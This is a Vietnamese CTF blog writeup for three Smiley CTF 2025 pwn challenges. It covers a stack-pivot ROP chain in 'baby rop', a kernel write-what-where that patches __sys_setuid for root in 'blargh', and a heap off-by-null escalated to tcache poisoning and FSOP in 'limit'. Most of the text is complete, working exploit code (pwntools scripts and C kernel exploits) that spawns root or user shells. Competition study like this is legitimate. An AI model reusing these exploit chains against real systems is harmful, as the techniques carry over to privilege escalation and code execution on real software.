---
title: "Smiley CTF2025"
date: 2025-07-10 00:00:00 +0800
categories: [pwn]
tags: [writeup]
author: "kuvee"
layout: post
---

## baby rop

- main: 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(_bss_start, 0);
  memset(s, 0, sizeof(s));
  gets(s);
  print(s);
  return 0;
}
```

- gets: 

```c
__int64 __fastcall gets(void *a1)
{
  int v2; // [rsp+1Ch] [rbp-4h]

  v2 = read(0, a1, 0x2BCu);
  if ( v2 > 0 )
    *((_BYTE *)a1 + v2 - 1) = 0;
  return (unsigned int)v2;
}
```

- printf: 

![image](https://hackmd.io/_uploads/r1ROJTCNle.png)


- bài này đơn giản là 1 bài `pivot` , cách dễ hình dung ra nhất có lẽ là tận dụng `printf` ở đây : 


nếu ta có thể thay đổi `rbp` thành `got` hoặc 1 con trỏ chứa libc thì ta hoàn toàn có thể leak ... 


![image](https://hackmd.io/_uploads/Hy7jGT0Elx.png)


exp (lụm từ 1 fen trên discord) 

```python
from pwn import *

elf =  context.binary = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
gs = '''
'''
# ========= Gadgets =========
pop_rbp = 0x401181
leave_ret = 0x401226
pop_rcx = 0x40117e
ret = 0x401227

p = process()
# gdb.attach(p, gdbscript=gs)

payload = flat({
    0x20:0x404038 + 0x20,  #Setting this as RBP
    0x28:0x0000000000401205,  # RIP --> gets of main
}, filler=b'\x00')

log.info(f'Sent payload: {payload}')
p.sendline(payload)
input("Press Enter to continue...")
payload = flat({
    0: [
        pop_rbp,  # pop rbp
        0x0000000000404150,  # points to main address in .bss
        leave_ret   # leave ; ret
    ],
    0x20: elf.sym.print + 0x20,  # RBP --> @puts+0x20
    0x28: [
        0x401227, # increasing the stack space
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x0000000000401211,
        elf.sym.main] # This is the value at address 0x0000000000404150
})
log.info(f'Sending payload: {payload}')
log.info(f'length: {len(payload)} bytes')
log.info(f'RBP({hex(0x404038) }) + LEN({hex(len(payload)-16)}) = {hex(0x404038 + len(payload)-16)} Main address in .bss: {hex(0x404150)}')
p.sendline(payload)

p.recvline()
p.recvline()
# p.recvline()
libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.puts
log.success(f'{hex(libc.address) = }')

rop = ROP(libc)
rop.rdi = next(libc.search(b'/bin/sh\x00'))
rop.rsi = 0
rop.rbp = 0x404198
rop.raw(libc.address + 0x00000000000981ad) # pop rdx ; leave ; ret
rop.raw(0)
rop.execve()

print(rop.dump())

p.sendline(flat({
    0x28: rop.chain()
}))

p.interactive()

```

- vì khá lười nên ý tưởng là zạy thoi , ta sẽ tìm những wu hay hay :3 

đầu tiên đối với những bài chưa leak được libc thì gadget này khá là .. 

```asm
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```

- tiếp theo là cái này , nhờ vào đoạn này -> nếu control `rdx` ta sẽ control `rbx`

![image](https://hackmd.io/_uploads/rkUyda0Vxg.png)

![image](https://hackmd.io/_uploads/rJ_PlC0Eex.png)



cuối cùng là đoạn này , `rbp` là `reg` hoàn toàn có thể control -> ta control được rdx -> control được `rbx` , vậy kết hợp với cái gadget đầu tiên thì ta hoàn toàn không cần leak libc , tuy nhiên còn tùy thuộc vào `one_gadget` có thõa hay không nên cách này không khuyến kích  ....

![image](https://hackmd.io/_uploads/SJZ4dTAExl.png)

- đầu tiên ta sẽ setup offset để add printf -> system vào bss -> sau đó debug để xử lí control flow sao cho chuẩn để từ rdx->rbx (setup xong bước 1) 


- setup 2 đơn giản là setup rbp+0x3d với rbp là 1 con trỏ chứa libc và setup làm sao cho /bin/sh nằm ở [rbp-0x20] ta cũng có thể dùng one-gadget để đơn giản bước này hơn 







final

![image](https://hackmd.io/_uploads/rJ43-CA4ge.png)


exp: 

```python
def exploit():
    one_gadget_offset = 0xEF52B - 0x2A28B - 0x800 - 1
    one_gadget_offset = 0x100000000 - (libc.sym["puts"] - libc.sym["system"])
    leave_ret = 0x4011CD
    pop_rbp = 0x000000000040115D
    magic_gadget_1 = 0x040114C  # adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x3090; mov byte ptr [rip + 0x2efb], 1; pop rbp; ret;
    magic_gadget_2 = 0x000000000040115C  # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    main = 0x401205
    target = 0x404010  # printf
    _start = 0x040109D

    #  0x401205 <main+54>:  lea    rax,[rbp-0x20]
    pl = b"a" * 0x20 + p64(exe.bss() + 0xF00) + p64(main)
    
    input("pl1")
    s(pl)
    
    pl = p64(one_gadget_offset) * 3
    pl += (
        p64(one_gadget_offset)
        + p64(exe.bss() + 0x800)
        + p64(pop_rbp)
        + p64(0x404EF8 - 0x48)
    )
    pl += p64(magic_gadget_1) + p64(0) + p64(_start)
    
    input("pl2")
    s(pl)
    
    input("pl3")
    
    pl = b"a" * 0x20 + p64(exe.bss() + 0xF00) + p64(pop_rbp) + p64(target + 0x3D)
    pl += (
        p64(magic_gadget_2)
        + p64(pop_rbp)
        + p64(target - 8)
        + p64(pop_rbp + 1)
        + p64(pop_rbp)
    )
    pl += p64(exe.bss() + 0x800) + p64(0x401205)
    
    s(pl)
    input("/bin/sh")
    
    sl(b"/bin/sh")

    interactive()
```



## blargh

- đây là 1 bài kernel `write-what-where` one NULL byte , ở trong giải thì mình đã patch thành công để tạo loop và `target` là `cred` và thậm chí sau 1 lúc brute-force thì nó thành công ở local , nhưng sever thì không , sau 1 lúc tìm hiểu lại thì những thằng này được allocated khác nhau bởi `kmem_caches` . vì vậy có lẽ không thể brute-force được 

![image](https://hackmd.io/_uploads/BkNY8CR4ge.png)

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#define PRINTK 0xffffffff81303260
#define IOCTL_MAGIC 0x40086721
int main() {
  int fd = open("/dev/blargh", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return 1;
  }
  printf("done\n");
  fflush(stdout);
  unsigned long offset = 0x3ecfcdbf;
  if (ioctl(fd, 0x40086721, offset) < 0) {
    perror("ioctl");
  }

  uint64_t cred_base = 0xffff888004300000;
  uint64_t cred_end = 0xffff8880043d0000ULL;
  uint64_t step = 0x100;
  for (uint64_t guess = cred_base; guess < cred_end; guess += step) {
    uint64_t offsets[] = {
        0x08, 0x09, // uid
        0x18, 0x19, // fsuid
    };
    int failed = 0;
    for (int i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++) {
      int64_t offset = (int64_t)(guess + offsets[i] - PRINTK);
      if (ioctl(fd, IOCTL_MAGIC, offset) < 0) {
        perror("[-] ioctl failed");
        failed = 1;
        break;
      }
    }
    if (failed)
      continue;

    if (geteuid() == 0) {
      printf("[+] Got root!\n");
      system("/bin/sh");
      break;
    }
  }

  printf("close!!!\n");
  fflush(stdout);
  close(fd);
  return 0;
}
```



- đầu tiên ta sẽ check `struct file_operations` để xem các hàm xử lí ở `dev` , ta sẽ thao tác thông qua `ioctl` 


![image](https://hackmd.io/_uploads/HyWkwRCNxl.png)

- src rất đơn giản , đầu tiên nó đọc giá trị của `reg cr0` , sau đó xor với bit thứ 16 

```c
__int64 __fastcall blargh_ioctl(__int64 a1, int a2, __int64 offset)
{
  unsigned __int64 cr0; // rax
  unsigned __int64 v4; // rax

  if ( a2 != 0x40086721 || !writes )
    return -1;
  cr0 = __readcr0();
  __writecr0(cr0 ^ 0x10000);
  *((_BYTE *)&printk + offset) = 0;
  v4 = __readcr0();
  __writecr0(v4 ^ 0x10000);
  writes = 0;
  return 0;
}
```

- ta có thể đọc ở đây để xem nó hoạt động thế nào : https://stackoverflow.com/questions/63661249/what-does-write-cr0read-cr0-0x10000-do

nói đơn giản  , `cr0` là 1 thanh ghi chứa các flags tính năng liên quan đến bảo vệ bộ nhớ , phân trang , đa nhiệm ... và Bit 16 (0x10000) trong CR0 là WP (Write Protect) , nếu bit này là 0 thì ta có thể ghi vào vùng `read only` 

- vậy đơn giản là truyền vào 1 offset -> ghi byte null vào `printf+offset` , và ta có thể ghi lên các địa chỉ `read_only `

như ban đầu mình nói thì target của mình đã sai :))) target đúng ở bài này sẽ là patch ở hàm `__sys_setuid` , nó sẽ được xử lí khi ta gọi `set_uid`

![image](https://hackmd.io/_uploads/BkQLjRAEex.png)

https://elixir.bootlin.com/linux/v6.14/source/kernel/sys.c#L639


- ta sẽ để ý đoạn này , nó sẽ check process hiện tại có `CAP_SETUID` không? có nghĩa là nó có quyền để thay đổi uid không? nếu có thì sẽ gán `uid` mới cho process hiện tại 
```c
if (ns_capable_setid(old->user_ns, CAP_SETUID)) {
		new->suid = new->uid = kuid;
		if (!uid_eq(kuid, old->uid)) {
			retval = set_user(new);
			if (retval < 0)
				goto error;
		}
```

- ta có thể xem nó trong `gdb` , ta thấy sau đó nó sẽ `test al al` và nếu bằng thì sẽ out


![image](https://hackmd.io/_uploads/H1qua0R4el.png)

- còn nếu không bằng thì nó sẽ `commit_creds` với uid mới , vậy ta sẽ patch đoạn `0xffffffff812a86a7` thành `jne` là được 

![image](https://hackmd.io/_uploads/HJbeAR04xg.png)

`84c0` sẽ là `test al al` và `74 7a` là je 

![image](https://hackmd.io/_uploads/BJ9rJJ1rgg.png)

- aslr tắt nên có thể tính `offset` 1 cách dễ dàng

![image](https://hackmd.io/_uploads/BJKglJkSxl.png)



- final

![image](https://hackmd.io/_uploads/BksW_1yreg.png)

exp: 

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
typedef uint64_t u64;
typedef int64_t i64;

#define offset 0x5abb6 // troll
#define dev "/dev/blargh"
/* gef> p/x 0xffffffff81303260-0xffffffff812a86aa
$3 = 0x5abb6 */
int main() {
  int fd = open(dev, O_RDONLY);
  if (fd < 0) {
    perror("open");
    exit(-1);
  }
  i64 off = 0xffffffff812a86aa - 0xffffffff81303260;
  if (ioctl(fd, 0x40086721, off) < 0) {
    perror("ioctl");
    exit(-1);
  }
  uid_t uid = 0;
  if (setuid(uid) < 0) {
    perror("setuid");
    exit(-1);
  }
  if (getuid() != 0) {
    puts("no root!!!");
    exit(-1);
  }
  puts("[+] root right now!! ");
  execl("/bin/sh", "-sh", NULL);
}
```

ngoài ra ta cũng có thể dùng `mprobe_path` với version mới https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch

và 1 cách khác trong đây : https://github.com/imLZH1/2025-CTF-writep/tree/main/2025-smileyCTF



## limit


- đầu tiên chương trình sẽ `malloc` và `free` để tạo 1 vùng memory ở heap , sau đó `sbrk(0)` để lấy địa chỉ `end` ở heap và thằng này được check trong `option1` của chương trình 

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // rax
  unsigned __int64 v4; // rbx
  unsigned __int16 v5; // ax
  unsigned int choice; // [rsp+8h] [rbp-38h] BYREF
  int lenght; // [rsp+Ch] [rbp-34h]
  unsigned __int64 idx; // [rsp+10h] [rbp-30h] BYREF
  size_t size; // [rsp+18h] [rbp-28h] BYREF
  char *v10; // [rsp+20h] [rbp-20h]
  unsigned __int64 v11; // [rsp+28h] [rbp-18h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  v3 = malloc(0x418u);
  free(v3);
  v10 = (char *)sbrk(0);
  puts("hi");
  while ( 1 )
  {
    puts("Options:");
    puts("1) malloc up to 0x100 bytes");
    puts("2) free chunks and clear ptr");
    puts("3) print chunks using puts");
    puts("4) read to chunks with max possible size");
    printf("> ");
    if ( !(unsigned int)__isoc99_scanf("%d", &choice) )
      getchar();
    if ( choice == 4 )
    {
      printf("Index: ");
      if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )// long int -> <= 0xf
      {
LABEL_36:
        puts("idx < 0x10");
        goto LABEL_43;
      }
      if ( !chunks[idx] )
        goto LABEL_38;
      printf("Data: ");
      lenght = read(0, chunks[idx], sizes[idx]);
      if ( lenght > 0 )
        chunks[idx][lenght] = 0;                // bug
      else
        puts("read failed");
    }
    else
    {
      if ( choice > 4 )
        goto LABEL_42;
      if ( choice == 3 )                        // option3 : puts chunk
      {
        printf("Index: ");
        if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )
          goto LABEL_36;
        if ( chunks[idx] )
        {
          printf("Data: ");
          puts(chunks[idx]);
          goto LABEL_43;
        }
        goto LABEL_38;
      }
      if ( choice != 1 )
      {
        if ( choice == 2 )                      // option2
        {
          printf("Index: ");
          if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )
            goto LABEL_36;
          if ( chunks[idx] )
          {
            free(chunks[idx]);                  // free
            chunks[idx] = 0;
            sizes[idx] = 0;
            goto LABEL_43;
          }
LABEL_38:
          puts("no chunk at this idx");
          goto LABEL_43;
        }
LABEL_42:
        puts("invalid option");
        goto LABEL_43;
      }
      printf("Index: ");
      if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )
        goto LABEL_36;
      printf("Size: ");
      if ( (unsigned int)__isoc99_scanf("%ld", &size) && size && size <= 0xF8 )
      {
        v4 = idx;
        chunks[v4] = (char *)malloc(size);
        if ( v10 >= chunks[idx] )
        {
          if ( size <= 0x18 )
            v5 = 24;
          else
            v5 = ((size + 7) & 0xFFF0) + 8;
          sizes[idx] = v5;
        }
        else
        {
          puts("hey where do you think ur going");
          chunks[idx] = 0;
        }
      }
      else
      {
        puts("0 < sz <= 0xf8");
      }
    }
LABEL_43:
    puts(&byte_211F);
  }
}
```


- option1: nhập 1 `idx` và 1 `size` với điều kiện `size` <= 0xf8 , sau đó malloc và check với địa chỉ được `sbrk(0)` lúc nãy , nếu chunk được malloc trả về bé hơn thì nó sẽ gán `chunk[idx] = 0` , có nghĩa là ta không thao tác được gì với chunk này 

nếu thõa thì nó sẽ căn chỉnh size của ta theo điều kiện 

```c
printf("Index: ");
      if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )
        goto LABEL_36;
      printf("Size: ");
      if ( (unsigned int)__isoc99_scanf("%ld", &size) && size && size <= 0xF8 )
      {
        v4 = idx;
        chunks[v4] = (char *)malloc(size);
        if ( v10 >= chunks[idx] )
        {
          if ( size <= 0x18 )
            v5 = 24;
          else
            v5 = ((size + 7) & 0xFFF0) + 8;
          sizes[idx] = v5;
        }
        else
        {
          puts("hey where do you think ur going");
          chunks[idx] = 0;
        }
      }
      else
      {
        puts("0 < sz <= 0xf8");
```

-option2 : đơn giản là free(chunk[idx]) và sẽ khong có UAF ở đây 


```c
 if ( choice == 2 )                      // option2
        {
          printf("Index: ");
          if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )
            goto LABEL_36;
          if ( chunks[idx] )
          {
            free(chunks[idx]);                  // free
            chunks[idx] = 0;
            sizes[idx] = 0;
            goto LABEL_43;
          }
```

- option3: in dữ liệu của heap ra 

```c
if ( choice == 3 )                        // option3 : puts chunk
      {
        printf("Index: ");
        if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )
          goto LABEL_36;
        if ( chunks[idx] )
        {
          printf("Data: ");
          puts(chunks[idx]);
          goto LABEL_43;
        }
```

- option4: ta sẽ được nhập 1 `idx` và nhập dữ liệu vào chunk[idx] đó với sizes[idx] , và bug sẽ xảy ra ở đây  , ta thấy sau khi read xong thì nó gán byte NULL vào chunk[idx][lenght] , nhưng nếu có dữ liệu đằng sau -> có thể overwrite dữ liệu phía sau bằng 1 byte NULL (trong bài này sẽ là size của chunk kế tiếp)

```c
if ( choice == 4 )
    {
      printf("Index: ");
      if ( !(unsigned int)__isoc99_scanf("%ld", &idx) || idx > 0xF )// long int -> <= 0xf
      {
LABEL_36:
        puts("idx < 0x10");
        goto LABEL_43;
      }
      if ( !chunks[idx] )
        goto LABEL_38;
      printf("Data: ");
      lenght = read(0, chunks[idx], sizes[idx]);
      if ( lenght > 0 )
        chunks[idx][lenght] = 0;                // bug
      else
        puts("read failed");
```



![image](https://hackmd.io/_uploads/HJBFNbBHle.png)

- khi free chunk 0x100 thì nó sẽ gộp với 2 chunk ở trên và vào unsorted-bin , tiếp tục lấy chunk đó ra free ở `tcache` và overwrite `fd` của nó


![image](https://hackmd.io/_uploads/rkYRIZBBex.png)


- bây giờ nó sẽ đi dến `tcache_perstruct`

![image](https://hackmd.io/_uploads/rJKWwZrrxe.png)


- nó đang giữ `tcache_entry` là `0x55bee5da73e0` ta sẽ thay đổi thành `libc_argv` để leak `stack`

![image](https://hackmd.io/_uploads/BJE3w-Srgl.png)


![image](https://hackmd.io/_uploads/By2nPZrSgg.png)

- lúc này ta có thể lấy libc_argv thành 1 chunk nhưng nó không gán vào chunks[idx] vì giới hạn `size` , lúc này ta chỉ leak được `idx` 14 là đã bị safe-linking biến đổi , đơn giản ta sẽ 

![image](https://hackmd.io/_uploads/Hy8F-MBrlx.png)

- do khi đưa vào bins thì nó sẽ lấy địa chỉ hiện tại >> 12 với target 

![image](https://hackmd.io/_uploads/SJ7XEGBHgg.png)

- vậy đơn giản ta có thể leak stack easy

![image](https://hackmd.io/_uploads/BJZ7HMSSxx.png)

exp: 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from subprocess import check_output
from time import sleep

from pwnsol import *

# from ctypes import *
# glibc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
# now = int(time.time())
# glibc.srand(now)


context.log_level = "debug"
context.terminal = [
    "wt.exe",
    "-w",
    "0",
    "split-pane",
    "-d",
    ".",
    "wsl.exe",
    "-d",
    "kali-linux",
    "--",
    "bash",
    "-c",
]
exe = context.binary = ELF("./limit_patched", checksec=False)
libc = exe.libc

gdbscript = """
brva 0x000000000000166E
brva 0x0000000000001585
brva 0x0000000000001445
brva 0x0000000000001742
c
"""


def start(argv=[]):
    if args.GDB:
        p = process([exe.path] + argv)
        gdb.attach(p, gdbscript=gdbscript)
        pause()
        return p
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(
            int(pid),
            gdbscript=gdbscript
            + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe",
            exe=exe.path,
        )
        pause()
        return p
    else:
        return process([exe.path] + argv)


# ==================== EXPLOIT ====================
def init():
    global p
    p = start()


# p = process(["qemu-ppc", "-g", "1234", "./sp33d1"])
# p = process(["qemu-mipsel", "-L", "rootfs", "-g", "1234", "./mips_patched"])
def defuscate(x, l=64):
    p = 0
    for i in range(l * 4, 0, -4):  # 16 nibble
        v1 = (x & (0xF << i)) >> i
        v2 = (p & (0xF << i + 12)) >> i + 12
        p |= (v1 ^ v2) << i
    return p


def obfuscate(p, adr):
    return p ^ (adr >> 12)


def create(index, size):
    sla(b"> ", b"1")
    sla(b"Index:", str(index).encode())
    sla(b"Size:", str(size).encode())


def free(index):
    sla(b"> ", b"2")
    sla(b"Index:", str(index).encode())


def view(index):
    sla(b"> ", b"3")
    sla(b"Index:", str(index).encode())


def write_into(index, content):
    sla(b"> ", b"4")
    sla(b"Index:", str(index).encode())
    sa(b"Data: ", content)


def exploit():
    create(0, 24)
    create(1, 24)

    free(0)
    free(1)
    create(0, 24)
    view(0)
    ru(b"Data: ")
    heap_base = defuscate(u64(r(6).ljust(8, b"\x00"))) + 0x562C4DACE000 - 0x562C4DACE2A0
    # heap_base = u64(r(5).ljust(8, b"\x00")) << 12
    info(f"heap: {hex(heap_base)}")
    free(0)
    create(0, 24)
    for i in range(8):
        create(i, 0xF8)
    for i in range(7, -1, -1):
        free(i)

    create(0, 32)
    view(0)
    ru(b"Data: ")
    libc.address = u64(r(6).ljust(8, b"\x00")) - 0x203C10
    logbase()
    create(0, 0xF8 - 32)
    for i in range(1, 8):
        create(i, 0xF8)

    create(0, 24)
    create(0, 0xD0 - 8)
    create(0, 0x100 - 0x30)

    target = obfuscate(heap_base + 0x100, heap_base)
    create(8, 0x38)
    offset = 0xCA0
    address = offset + heap_base
    write_into(8, p64(0) + p64(0x60) + p64(address) + p64(address))

    create(9, 0x28)
    create(10, 0xF8)
    create(11, 24)
    write_into(9, b"\x00" * (0x28 - 8) + p64(0x60))
    for i in range(7, 0, -1):
        free(i)
    free(10)
    create(12, 0xD8)
    create(13, 0x28)
    free(13)
    free(9)
    write_into(12, p64(0) * 5 + p64(0x31) + p64(target)[:7])
    create(13, 0x28)

    libc_argv = libc.address + 0x2046E0
    stack_offset = 0x7FFE1EBBF2A8 - 0x7FFE1EBBF258 - 8
    info(f"libc_argv: {hex(libc_argv)}")
    create(14, 0x28)
    input("write")
    stack_offset = 0x7FFE1EBBF2A8 - 0x7FFE1EBBF258 - 8
    write_into(14, p64(libc_argv))
    input()
    create(0, 0xF8)
    view(14)
    ru(b"Data: ")
    temp = u64(r(6).ljust(8, b"\x00"))
    stack_leak = obfuscate(temp, libc_argv)
    info(f"stack leak: {hex(stack_leak)}")
    input("ok")
    write_into(14, p64(stack_leak - stack_offset))
    create(2, 0xF8)
    view(14)
    ru(b"Data: ")
    temp = u64(r(6).ljust(8, b"\x00"))
    exe.address = obfuscate(temp, stack_leak) + 0x60EA2433C000 - 0x60EA2433D160
    info(f"exe: {hex(exe.address)}")
    input("write")
    write_into(14, p64(exe.sym.chunks + 0x10))
    create(2, 0xF8)
    write_into(
        2,
        p64(exe.sym.chunks + 0x10)
        + p64(libc.sym._IO_2_1_stdout_)
        + p64(0) * (16 - 4)
        + p16(0x1F0) * 16,
    )
    stdout_lock = (
        libc.sym["_IO_2_1_stdout_"] + 0x250
    )  # _IO_stdfile_1_lock  (symbol not exported)
    stdout = libc.sym["_IO_2_1_stdout_"]
    fake_vtable = libc.sym["_IO_wfile_jumps"] - 0x18
    gadget = libc.address + 0x00000000001724F0  # add rdi, 0x10 ; jmp rcx

    fake = FileStructure(0)
    fake.flags = 0x3B01010101010101
    fake._IO_read_end = libc.sym.system
    fake._IO_save_base = gadget
    fake._IO_write_end = u64(b"/bin/sh\x00")  # will be at rdi+0x10
    fake._lock = stdout_lock
    fake._codecvt = stdout + 0xB8
    fake._wide_data = stdout_lock + 0x18
    fake.unknown2 = p64(0) * 2 + p64(stdout + 0x20) + p64(0) * 3 + p64(fake_vtable)
    payload = bytes(fake)
    #############################################################################################
    write_into(3, payload[:0x1E0])

    interactive()


if __name__ == "__main__":
    init()
    exploit()
```

- tóm lại bài này từ off-byte-null ta có thể biến các chunk chưa được free thành chunk đã free nhờ vào gộp chunk , sau đó chỉ việc malloc trên các `idx` khác để malloc và `free` lại , lúc này ta hoàn toàn có thể `control được fd của tcache` và target là `perstruct_thread`  , lần lượt leak stack -> exe , và target tiếp theo là chunks[idx] , thay chunks[idx] nào đó thành `stdout` và `fsop`